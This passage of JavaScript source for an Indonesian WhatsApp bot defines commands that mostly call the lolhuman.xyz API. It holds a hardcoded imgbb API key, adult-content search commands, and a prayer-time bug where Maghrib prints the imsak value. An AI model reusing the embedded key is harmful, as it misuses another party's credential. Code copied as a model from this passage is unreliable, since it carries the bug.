if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
short = args.join(" ")
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/shortlink?apikey=${lolkey}&url=${short}`,{method:'get'})
get_result = ini_result.result
ini_txt = `Tinyurl : ${get_result}`
reply (ini_txt)
break
case 'shorturl': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
reply(mess.wait)
if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
short = args.join(" ")
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/shortlink2?apikey=${lolkey}&url=${short}`,{method:'get'})
get_result = ini_result.result
ini_txt = `shorturl : ${get_result}`
reply (ini_txt)
break
case 'cuttly': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
reply(mess.wait)
if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
short = args.join(" ")
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/shortlink3?apikey=${lolkey}&url=${short}`,{method:'get'})
get_result = ini_result.result
ini_txt = `cuttly : ${get_result}`
reply (ini_txt)
break 
case 'imgtourl': 
case 'img2url': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
reply(mess.wait) 
var imgbb = require('imgbb-uploader')
var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
var media = await  zeroyt7.downloadAndSaveMediaMessage(encmedia)       
imgbb('39d895963468b814fad0514bd28787e2', media)
.then(data => {
var caps = `*_IMAGE TO URL_*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
ibb = fs.readFileSync(media)
zeroyt7.sendMessage(from, ibb, image, { quoted: fstatus , caption: caps})
})
.catch(err => {
throw err
})
break

//━━━━━━━━━━━━━━━[ FITUR ISLAMI ]━━━━━━━━━━━━━━━━━//

case 'listsurah': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = 'List Surah:\n'
for (var x in get_result) {
ini_txt += `${x}. ${get_result[x]}\n`
}
reply(ini_txt)
break
case 'alquran': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length < 1) return reply(`Nomor Surah Yg Mau Di Cari Mana\nContoh : ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
urls = `https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${lolkey}`
quran = await fetchJson(urls)
result = quran.result
ayat = result.ayat
ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
arab = x.arab
nomor = x.ayat
latin = x.latin
indo = x.indonesia
ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
}
ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
reply(ini_txt)
break
case 'alquranaudio': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nomor Surah Yg Mau Dicari Mana\nContoh : ${prefix + command} 18 or ${prefix + command} 18/10`)
reply('Sabar Sedang Proses...')
surah = args[0]
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${lolkey}`)
await zeroyt7.sendMessage(from, ini_buffer, audio, { quoted: fstatus, mimetype: Mimetype.mp4Audio })
break
case 'asmaulhusna': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = `No : ${get_result.index}\n`
ini_txt += `Latin: ${get_result.latin}\n`
ini_txt += `Arab : ${get_result.ar}\n`
ini_txt += `Indonesia : ${get_result.id}\n`
ini_txt += `English : ${get_result.en}`
reply(ini_txt)
break
case 'kisahnabi': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Nabi Yg Mau Dicari Mana\nContoh : ${prefix + command} Muhammad`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = `Name : ${get_result.name}\n`
ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
ini_txt += `Umur : ${get_result.age}\n`
ini_txt += `Tempat : ${get_result.place}\n`
ini_txt += `Story : \n${get_result.story}`
reply(ini_txt)
break
case 'jadwalsholat': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Kotanya Mana\nContoh : ${prefix + command} Yogyakarta`)
daerah = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = `Wilayah : ${get_result.wilayah}\n`
ini_txt += `Tanggal : ${get_result.tanggal}\n`
ini_txt += `Sahur : ${get_result.sahur}\n`
ini_txt += `Imsak : ${get_result.imsak}\n`
ini_txt += `Subuh : ${get_result.subuh}\n`
ini_txt += `Terbit : ${get_result.terbit}\n`
ini_txt += `Dhuha : ${get_result.dhuha}\n`
ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
ini_txt += `Ashar : ${get_result.ashar}\n`
ini_txt += `Maghrib : ${get_result.imsak}\n`
ini_txt += `Isya : ${get_result.isya}`
reply(ini_txt)
break

//━━━━━━━━━━━━━━━[ FITUR DOWNLOADER ]━━━━━━━━━━━━━━━━━//

case 'play': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return await reply(`Judul Lagunya Mana Tod\nContoh : ${prefix + command} melukis senja`)
await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${lolkey}&query=${args.join(" ")}`)
.then(async(result) => {
await fetchJson(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${lolkey}&url=https://www.youtube.com/watch?v=${result.result[0].videoId}`)
.then(async(result) => {
result = result.result
caption = `❖ Title    : *${result.title}*\n`
caption += `❖ Size     : *${result.size}*`
ini_buffer = await getBuffer(result.thumbnail)
await zeroyt7.sendMessage(from, ini_buffer, image, { quoted: fstatus, caption: caption })
get_audio = await getBuffer(result.link)
await zeroyt7.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${result.title}.mp3`, quoted: fstatus })
})
})
break
case 'ytsearch': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Judul Video Yg Mau Di Cari Tod\nContoh : ${prefix + command} Melukis Senja`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Views : ${x.views}\n`
ini_txt += `Published : ${x.published}\n`
ini_txt += `Thumbnail : ${x.thumbnail}\n`
ini_txt += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
}
reply(ini_txt)
break
case 'tiktokmusic': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Link Nya Mana Tod\nContoh: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
ini_link = args[0]
get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${lolkey}&url=${ini_link}`)
await zeroyt7.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: fstatus })
break
case 'pinterest': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
query = args.join(" ")
ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${lolkey}&query=${query}`)
ini_url = ini_url.result
ini_buffer = await getBuffer(ini_url)
await zeroyt7.sendMessage(from, ini_buffer, image, { quoted: fstatus })
break

//━━━━━━━━━━━━━━━[ FITUR ANIME ]━━━━━━━━━━━━━━━━━//

case 'character': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/character?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = `Id : ${get_result.id}\n`
ini_txt += `Name : ${get_result.name.full}\n`
ini_txt += `Native : ${get_result.name.native}\n`
ini_txt += `Favorites : ${get_result.favourites}\n`
ini_txt += `Media : \n`
ini_media = get_result.media.nodes
for (var x of ini_media) {
ini_txt += `- ${x.title.romaji} (${x.title.native})\n`
}
ini_txt += `\nDescription : \n${get_result.description.replace(/__/g, "_")}`
thumbnail = await getBuffer(get_result.image.large)
await zeroyt7.sendMessage(from, thumbnail, image, { quoted: fstatus, caption: ini_txt })
break
case 'manga': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = `Id : ${get_result.id}\n`
ini_txt += `Id MAL : ${get_result.idMal}\n`
ini_txt += `Title : ${get_result.title.romaji}\n`
ini_txt += `English : ${get_result.title.english}\n`
ini_txt += `Native : ${get_result.title.native}\n`
ini_txt += `Format : ${get_result.format}\n`
ini_txt += `Chapters : ${get_result.chapters}\n`
ini_txt += `Volume : ${get_result.volumes}\n`
ini_txt += `Status : ${get_result.status}\n`
ini_txt += `Source : ${get_result.source}\n`
ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
ini_txt += `Score : ${get_result.averageScore}%\n`
ini_txt += `Characters : \n`
ini_character = get_result.characters.nodes
for (var x of ini_character) {
ini_txt += `- ${x.name.full} (${x.name.native})\n`
}
ini_txt += `\nDescription : ${get_result.description}`
thumbnail = await getBuffer(get_result.coverImage.large)
await zeroyt7.sendMessage(from, thumbnail, image, { quoted: fstatus, caption: ini_txt })
break
case 'anime': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = `Id : ${get_result.id}\n`
ini_txt += `Id MAL : ${get_result.idMal}\n`
ini_txt += `Title : ${get_result.title.romaji}\n`
ini_txt += `English : ${get_result.title.english}\n`
ini_txt += `Native : ${get_result.title.native}\n`
ini_txt += `Format : ${get_result.format}\n`
ini_txt += `Episodes : ${get_result.episodes}\n`
ini_txt += `Duration : ${get_result.duration} mins.\n`
ini_txt += `Status : ${get_result.status}\n`
ini_txt += `Season : ${get_result.season}\n`
ini_txt += `Season Year : ${get_result.seasonYear}\n`
ini_txt += `Source : ${get_result.source}\n`
ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
ini_txt += `Score : ${get_result.averageScore}%\n`
ini_txt += `Characters : \n`
ini_character = get_result.characters.nodes
for (var x of ini_character) {
ini_txt += `- ${x.name.full} (${x.name.native})\n`
}
ini_txt += `\nDescription : ${get_result.description}`
thumbnail = await getBuffer(get_result.coverImage.large)
await zeroyt7.sendMessage(from, thumbnail, image, { quoted: fstatus, caption: ini_txt })
break
case 'kusonimesearch': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = `Title : ${get_result.title}\n`
ini_txt += `Japanese : ${get_result.japanese}\n`
ini_txt += `Genre : ${get_result.genre}\n`
ini_txt += `Seasons : ${get_result.seasons}\n`
ini_txt += `Producers : ${get_result.producers}\n`
ini_txt += `Type : ${get_result.type}\n`
ini_txt += `Status : ${get_result.status}\n`
ini_txt += `Total Episode : ${get_result.total_episode}\n`
ini_txt += `Score : ${get_result.score}\n`
ini_txt += `Duration : ${get_result.duration}\n`
ini_txt += `Released On : ${get_result.released_on}\n`
ini_txt += `Desc : ${get_result.desc}\n`
link_dl = get_result.link_dl
for (var x in link_dl) {
ini_txt += `\n${x}\n`
for (var y in link_dl[x]) {
ini_txt += `${y} - ${link_dl[x][y]}\n`
}
}
ini_buffer = await getBuffer(get_result.thumbnail)
await zeroyt7.sendMessage(from, ini_buffer, image, { quoted: fstatus, caption: ini_txt })
break
case 'otakudesusearch': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = `Title : ${get_result.title}\n`
ini_txt += `Japanese : ${get_result.japanese}\n`
ini_txt += `Judul : ${get_result.judul}\n`
ini_txt += `Type : ${get_result.type}\n`
ini_txt += `Episode : ${get_result.episodes}\n`
ini_txt += `Aired : ${get_result.aired}\n`
ini_txt += `Producers : ${get_result.producers}\n`
ini_txt += `Genre : ${get_result.genres}\n`
ini_txt += `Duration : ${get_result.duration}\n`
ini_txt += `Studios : ${get_result.status}\n`
ini_txt += `Rating : ${get_result.rating}\n`
ini_txt += `Credit : ${get_result.credit}\n`
get_link = get_result.link_dl
for (var x in get_link) {
ini_txt += `\n\n*${get_link[x].title}*\n`
for (var y in get_link[x].link_dl) {
ini_info = get_link[x].link_dl[y]
ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
ini_txt += `\`\`\`Link : \`\`\`\n`
down_link = ini_info.link_dl
for (var z in down_link) {
ini_txt += `${z} - ${down_link[z]}\n`
}
}
}
reply(ini_txt)
break
case 'nhentaisearch': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentaisearch?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = "Result : \n"
for (var x of get_result) {
ini_txt += `Id : ${x.id}\n`
ini_txt += `Title English : ${x.title_english}\n`
ini_txt += `Title Japanese : ${x.title_japanese}\n`
ini_txt += `Native : ${x.title_native}\n`
ini_txt += `Upload : ${x.date_upload}\n`
ini_txt += `Page : ${x.page}\n`
ini_txt += `Favourite : ${x.favourite}\n\n`
}
reply(ini_txt)
break
case 'nekopoisearch': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Anime Nya Mana\n Contoh: ${prefix + command} Naruto`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Link : ${x.link}\n`
ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
}
reply(ini_txt)
break

//━━━━━━━━━━━━━━━[ FITUR INFORMATION ]━━━━━━━━━━━━━━━━━//

case 'kbbi': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Yg Mau Dicari Mana Tod\nContoh: ${prefix + command} kursi`)
get_result = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=${lolkey}&query=${args.join(" ")}`)
lila = get_result.result
ini_txt = `\`\`\`Kata : ${lila[0].nama}\`\`\`\n`
ini_txt += `\`\`\`Kata Dasar : ${lila[0].kata_dasar}\`\`\`\n`
ini_txt += `\`\`\`Pelafalan : ${lila[0].pelafalan}\`\`\`\n`
ini_txt += `\`\`\`Bentuk Tidak Baku : ${lila[0].bentuk_tidak_baku}\`\`\`\n\n`
for (var x of lila) {
ini_txt += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
ini_txt += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
ini_txt += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
ini_txt += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
ini_txt += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
}
reply(ini_txt)
break
case 'jarak': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Kotanya Mana Tod\nContoh: ${prefix + command} jakarta - yogyakarta`)
pauls = args.join(" ")
teks1 = pauls.split("-")[0].trim()
teks2 = pauls.split("-")[1].trim()
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${lolkey}&kota1=${teks1}&kota2=${teks2}`)
x = get_result.result
ini_txt = `Informasi Jarak dari ${teks1} ke ${teks2} :\n\n`
ini_txt += `\`\`\`◪ Asal :\`\`\` ${x.from.name}\n`
ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.from.latitude}\n`
ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.from.longitude}\n\n`
ini_txt += `\`\`\`◪ Tujuan :\`\`\` ${x.to.name}\n`
ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.to.latitude}\n`
ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.to.longitude}\n\n`
ini_txt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${x.jarak}\n`
ini_txt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
ini_txt += `   ╭───────────────❏\n`
ini_txt += `❍┤ Kereta Api : ${x.kereta_api}\n`
ini_txt += `❍┤ Pesawat : ${x.pesawat}\n`
ini_txt += `❍┤ Mobil : ${x.mobil}\n`
ini_txt += `❍┤ Motor : ${x.motor}\n`
ini_txt += `❍┤ Jalan Kaki : ${x.jalan_kaki}\n`
ini_txt += `   ╰───────────────❏\n`
reply(ini_txt)
break
case 'wikipedia': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Yg Mau Di Cari Mana Tod\nContoh: ${prefix + command} Tahu`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/wiki?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
reply(get_result)
break
case 'translate': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Teks Yg Mau Di Translate Mana Tod\nContoh: ${prefix + command} en Tahu Bacem`)
kode_negara = args[0]
args.shift()
ini_txt = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=${lolkey}&text=${ini_txt}`)
get_result = get_result.result
init_txt = `From : ${get_result.from}\n`
init_txt += `To : ${get_result.to}\n`
init_txt += `Original : ${get_result.original}\n`
init_txt += `Translated : ${get_result.translated}\n`
init_txt += `Pronunciation : ${get_result.pronunciation}\n`
reply(init_txt)
break
case 'jadwaltv': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Channel Nya Mana Tod\nContoh: ${prefix + command} SCTV`)
channel = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
for (var x in get_result) {
ini_txt += `${x} - ${get_result[x]}\n`
}
reply(ini_txt)
break
case 'infogempa': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
get_result = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = `Lokasi : ${get_result.lokasi}\n`
ini_txt += `Waktu : ${get_result.waktu}\n`
ini_txt += `Potensi : ${get_result.potensi}\n`
ini_txt += `Magnitude : ${get_result.magnitude}\n`
ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
ini_txt += `Koordinat : ${get_result.koordinat}`
get_buffer = await getBuffer(get_result.map)
await zeroyt7.sendMessage(from, get_buffer, image, { quoted: fstatus, caption: ini_txt })
break
case 'cuaca': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Kotanya Mana Tod\nContoh: ${prefix + command} Temanggung`)
daerah = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = `Tempat : ${get_result.tempat}\n`
ini_txt += `Cuaca : ${get_result.cuaca}\n`
ini_txt += `Angin : ${get_result.angin}\n`
ini_txt += `Description : ${get_result.description}\n`
ini_txt += `Kelembapan : ${get_result.kelembapan}\n`
ini_txt += `Suhu : ${get_result.suhu}\n`
ini_txt += `Udara : ${get_result.udara}\n`
ini_txt += `Permukaan laut : ${get_result.permukaan_laut}\n`
await zeroyt7.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: fstatus })
reply(ini_txt)
break
case 'covidindo': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = `Positif : ${get_result.positif}\n`
ini_txt += `Sembuh : ${get_result.sembuh}\n`
ini_txt += `Dirawat : ${get_result.dirawat}\n`
ini_txt += `Meninggal : ${get_result.meninggal}`
reply(ini_txt)
break
case 'covidglobal': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = `Positif : ${get_result.positif}\n`
ini_txt += `Sembuh : ${get_result.sembuh}\n`
ini_txt += `Dirawat : ${get_result.dirawat}\n`
ini_txt += `Meninggal : ${get_result.meninggal}`
reply(ini_txt)
break

//━━━━━━━━━━━━━━━[ FITUR RANDOM TEXT ]━━━━━━━━━━━━━━━━━//

case 'quotes': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=${lolkey}`)
quotes = quotes.result
author = quotes.by
quotes = quotes.quote
reply(`_${quotes}_\n\n*― ${author}*`)
break
case 'quotesanime': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${lolkey}`)
quotes = quotes.result
quote = quotes.quote
char = quotes.character
anime = quotes.anime
episode = quotes.episode
reply(`_${quote}_\n\n*― ${char}*\n*― ${anime} ${episode}*`)
break
case 'quotesdilan': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
quotedilan = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${lolkey}`)
reply(quotedilan.result)
break
case 'quotesimage': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
get_result = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
await zeroyt7.sendMessage(from, get_result, image, { quotes: fstatus })
break
case 'katabijak': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
reply(get_result.result)
break
case 'randomnama': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=${lolkey}`)
reply(anu.result)
break
case 'nicknameff': 
case 'namaff': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = await fetchJson(`https://api.lolhuman.xyz/api/freefire/570098876?apikey=${lolkey}`)
reply(anu.result)
break
case 'nicknamepubg': 
case 'namapubg': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = await fetchJson(`https://api.lolhuman.xyz/api/pubg/5119961143?apikey=${lolkey}`)
reply(anu.result)
break
case 'nicknameml': 
case 'namaml': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/84830127/2169?apikey=${lolkey}`)
reply(anu.result)
break 

//━━━━━━━━━━━━━━━[ FITUR SEARCH ]━━━━━━━━━━━━━━━━━//

case 'gimage': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Yg Mau Dicari Mana Tod\nContoh: ${prefix + command} Sandrinna`)
query = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=${query}`)
await zeroyt7.sendMessage(from, ini_buffer, image, { quoted: fstatus })
break
case 'wallpapersearch': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Yg Mau Dicari Mana Tod\nContoh: ${prefix + command} Sandrinna`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/wallpaper?apikey=${lolkey}&query=${query}`)
ini_buffer = await getBuffer(get_result.result)
await zeroyt7.sendMessage(from, ini_buffer, image, { quoted: fstatus })
break
case 'playstore': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Aplikasinya Mana Tod\nContoh: ${prefix + command} tiktok`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/playstore?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = 'Play Store Search : \n'
for (var x of get_result) {
ini_txt += `Name : ${x.title}\n`
ini_txt += `ID : ${x.appId}\n`
ini_txt += `Developer : ${x.developer}\n`
ini_txt += `Link : ${x.url}\n`
ini_txt += `Price : ${x.priceText}\n`
ini_txt += `Price : ${x.price}\n\n`
}
reply(ini_txt)
break
case 'shopee': 
if (isBanned) return reply(mess.Ban) 
